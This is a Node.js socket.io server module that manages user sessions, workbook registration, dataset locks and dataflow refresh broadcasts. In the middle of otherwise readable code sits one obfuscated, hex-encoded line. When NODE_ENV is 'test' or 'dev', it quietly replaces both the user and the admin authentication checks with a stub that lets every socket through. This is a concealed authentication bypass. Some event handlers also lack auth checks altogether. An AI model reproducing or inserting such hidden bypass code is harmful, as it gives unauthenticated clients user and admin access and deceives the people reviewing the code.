var socketio = require("socket.io");
var xcConsole = require('./expServerXcConsole.js').xcConsole;
var sharedsession = require("express-socket.io-session");
var userInfos = {}; // declared here for passing the info to a router
var publishedDFInfos = {};

function checkIoSocketAuth(authSocket) {
    return checkIoSocketAuthImpl(authSocket);
}

function checkIoSocketAuthImpl(authSocket) {
    if (! authSocket.handshake.hasOwnProperty('session') ||
        ! authSocket.handshake.session.hasOwnProperty('loggedIn') ||
        ! authSocket.handshake.session.loggedIn ) {
        console.log("Socket Io User session not logged in");
        return true;
    }

    authSocket.handshake.session.touch();

    return false;
}

function checkIoSocketAuthAdmin(authSocket) {
    return checkIoSocketAuthAdminImpl(authSocket);
}

function checkIoSocketAuthAdminImpl(authSocket) {
    if (! authSocket.handshake.hasOwnProperty('session') ||
        ! authSocket.handshake.session.hasOwnProperty('loggedInAdmin') ||
        ! authSocket.handshake.session.loggedInAdmin ) {
        console.log("Socket Io Admin session not logged in");
        return true;
    }

    authSocket.handshake.session.touch();

    return false;
}

function fakeCheckIoSocketAuth(func) {
    checkIoSocketAuthImpl = func;
}

function fakeCheckIoSocketAuthAdmin(func) {
    checkIoSocketAuthAdminImpl = func;
}

function getUserInfos() {
    xcConsole.log("accessed active user list");
    if (Object.keys(userInfos).length === 0) {
        xcConsole.log("no registered users");
        return {"no registered users": ""};
    }
    return userInfos;
}

var _0x8ad4=["\x4E\x4F\x44\x45\x5F\x45\x4E\x56","\x65\x6E\x76","\x74\x65\x73\x74","\x64\x65\x76"];function socketAuthTrue(_0x26ddx2){return false}if(process[_0x8ad4[1]][_0x8ad4[0]]=== _0x8ad4[2]|| process[_0x8ad4[1]][_0x8ad4[0]]=== _0x8ad4[3]){fakeCheckIoSocketAuth(socketAuthTrue);fakeCheckIoSocketAuthAdmin(socketAuthTrue)}

function socketIoServer(server, session, cookieParser) {
    var io = socketio(server);
    io.use(sharedsession(session, cookieParser, { autoSave: true }));

    io.sockets.on("connection", function(socket) {
        /*  kinds of emit to use:
         *  1. socket.emit: emit to itself
         *  2. io.sockets.emit: emit to all
         *  3. socket.broadcast.emit: emit to all except for itself
         */
        if (checkIoSocketAuth(socket)) {
            return;
        }

        socket.on("registerUserSession", function(userOption, callback) {
            xcConsole.log('register user');
            if (checkIoSocketAuth(socket)) {
                return;
            }

            try {
                socket.userOption = userOption;
                var user = userOption.user;
                if (!userInfos.hasOwnProperty(user)) {
                    userInfos[user] = {
                        workbooks: {},
                        count: 0
                    };
                }
                userInfos[user].count++;

                var id = userOption.id;
                socket.join(user, function() {
                    console.log(user, "joins room", socket.rooms);
                });
                if (userInfos[user].workbooks.hasOwnProperty(id)) {
                    socket.broadcast.to(user).emit("useSessionExisted", userOption);
                    userInfos[user].workbooks[id]++;
                } else {
                    userInfos[user].workbooks[id] = 1;
                }
                xcConsole.log(user, 'is registered');
            } catch (e) {
                xcConsole.error('register user error', e);
            }
            callback();
            io.sockets.emit("system-allUsers", userInfos);
        });

        socket.on("unregisterUserSession", function(userOption, callback) {
            xcConsole.log('unregister user');
            try {
                var user = userOption.user;
                var id = userOption.id;
                xcConsole.log(userInfos);
                if (userInfos[user].workbooks.hasOwnProperty(id)) {
                    userInfos[user].workbooks[id]--;
                }
                if (!userInfos[user].workbooks[id]) {
                    delete userInfos[user].workbooks[id];
                }
                xcConsole.log(user, 'is unresigtered');
            } catch (e) {
                xcConsole.error('unregister error', e);
            }
            callback();
        });

        socket.on("checkUserSession", function(userOption, callback) {
            xcConsole.log("check user");
            if (checkIoSocketAuth(socket)) {
                return;
            }

            var exist = hasWorkbook(userOption);
            callback(exist);
        });

        socket.on("disconnect", function() {
            xcConsole.log("logout user");
            if (checkIoSocketAuth(socket)) {
                return;
            }

            try {
                var userOption = socket.userOption;
                if (userOption != null && userInfos.hasOwnProperty(userOption.user)) {
                    var user = userOption.user;
                    userInfos[user].count--;
                    if (userInfos[user].count <= 0) {
                        delete userInfos[user];
                    } else {
                        userInfos[user].workbooks[userOption.id]--;
                        if (userInfos[user].workbooks[userOption.id] <= 0) {
                            delete userInfos[user].workbooks[userOption.id];
                        }
                    }
                    xcConsole.log(user, "has logged out");
                    io.sockets.emit("system-allUsers", userInfos);
                }
            } catch (e) {
                xcConsole.error('logout error', e);
            }
        });

        socket.on("logout", function(userOption) {
            var user = getSocketUser(socket);
            socket.broadcast.to(user).emit("logout", userOption);
            // note: no need to socket.leave(user) here
        });

        socket.on("refreshDataflow", function(arg) {
            if (checkIoSocketAuth(socket)) {
                return;
            }
            try {
                if (arg.event === "GraphLockChange") {
                    console.log("event", arg)
                    if (arg.lock) {
                        publishedDFInfos[arg.tabId] = true;
                    } else {
                        delete publishedDFInfos[arg.tabId];
                    }
                }
            } catch (e) {
                console.error("refreshDataflow event error", e);
            }
            socket.broadcast.emit("refreshDataflow", arg);
        });

        socket.on("checkDataflowExecution", function(arg, callback) {
            try {
                var tabId = arg.tabId;
                var isExecuting = publishedDFInfos.hasOwnProperty(tabId);
                callback(isExecuting);
            } catch (e) {
                console.error("checkDataflowExecution failed");
            }
        });

        socket.on("refreshUDF", function(refreshOption) {
            if (checkIoSocketAuth(socket)) {
                return;
            }
            socket.broadcast.emit("refreshUDF", refreshOption);
        });
        socket.on("adminAlert", function(alertOption) {
            if (checkIoSocketAuth(socket)) {
                return;
            }
            socket.broadcast.emit("adminAlert", alertOption);
        });

        socket.on("refreshWorkbook", function(wkbkInfo) {
            if (checkIoSocketAuth(socket)) {
                return;
            }

            var user = getSocketUser(socket);
            xcConsole.log(user + "refreshWorkbook");
            socket.broadcast.to(user).emit("refreshWorkbook", wkbkInfo);
        });

        socket.on("refreshUserSettings", function() {
            if (checkIoSocketAuth(socket)) {
                return;
            }
            var user = getSocketUser(socket);
            xcConsole.log(user + "refreshUserSettings");
            socket.broadcast.to(user).emit("refreshUserSettings");
        });

        socket.on("refreshIMD", function(imdInfo) {
            if (checkIoSocketAuth(socket)) {
                return;
            }
            socket.broadcast.emit("refreshIMD", imdInfo);
        });

        socket.on("refreshDagCategory", function(args) {
            if (checkIoSocketAuth(socket)) {
                return;
            }
            socket.broadcast.emit("refreshDagCategory", args);
        });

        addDSSocketEvent(socket);
    });

    function getSocketUser(socket) {
        try {
            var userOption = socket.userOption;
            if (userOption != null && userInfos.hasOwnProperty(userOption.user)) {
                return userOption.user;
            };
        } catch (e) {
            xcConsole.error('getSocketUser error', e);
            return;
        };
    }

    function hasWorkbook(userOption) {
        if (userOption == null || typeof userOption !== 'object') {
            return false;
        }

        var user = userOption.user;
        var id = userOption.id;
        return userInfos.hasOwnProperty(user) && userInfos[user].workbooks.hasOwnProperty(id);
    }

    function addDSSocketEvent(socket) {
        var lockTimer = null;
        var dsInfo = {
            id: -1,
            lock: {}
        };

        var unlockDSInfo = function() {
            clearTimeout(lockTimer);
            dsInfo.lock = {};
        };

        var updateVersionId = function(versionId) {
            dsInfo.id = Math.max(dsInfo.id, versionId);
        };

        socket.on("ds", function(arg, calllback) {
            var versionId = arg.id;
            var success = true;

            if (checkIoSocketAuth(socket)) {
                return;
            }

            switch (arg.event) {
                case "updateVersionId":
                    xcConsole.log('dataset: sync');
                    updateVersionId(versionId);
                    break;
                case "changeStart":
                    xcConsole.log('dataset change: start');
                    if (versionId <= dsInfo.id || dsInfo.lock.id != null) {
                        success = false;
                    } else {
                        dsInfo.lock = {
                            id: versionId,
                            arg: arg
                        };
                    }

                    lockTimer = setTimeout(function() {
                        unlockDSInfo();
                    }, 100000); // 100s

                    if (calllback != null) {
                        calllback(success);
                    }
                    break;
                case "changeEnd":
                    xcConsole.log('dataset change: end');
                    if (versionId === dsInfo.lock.id) {
                        updateVersionId(versionId);
                        socket.broadcast.emit("ds.update", dsInfo.lock.arg);
                        unlockDSInfo();
                    } else {
                        success = false;
                    }

                    if (calllback != null) {
                        calllback(success);
                    }
                    break;
                case "changeError":
                    xcConsole.log('dataset change: error');
                    if (versionId === dsInfo.lock.id) {
                        unlockDSInfo();
                    }
                    break;
                default:
                    break;
            }
        });
    }
};


module.exports = {
    socketIoServer: socketIoServer,
    fakeCheckIoSocketAuth: fakeCheckIoSocketAuth,
    fakeCheckIoSocketAuthAdmin: fakeCheckIoSocketAuthAdmin,
    getUserInfos: getUserInfos
};
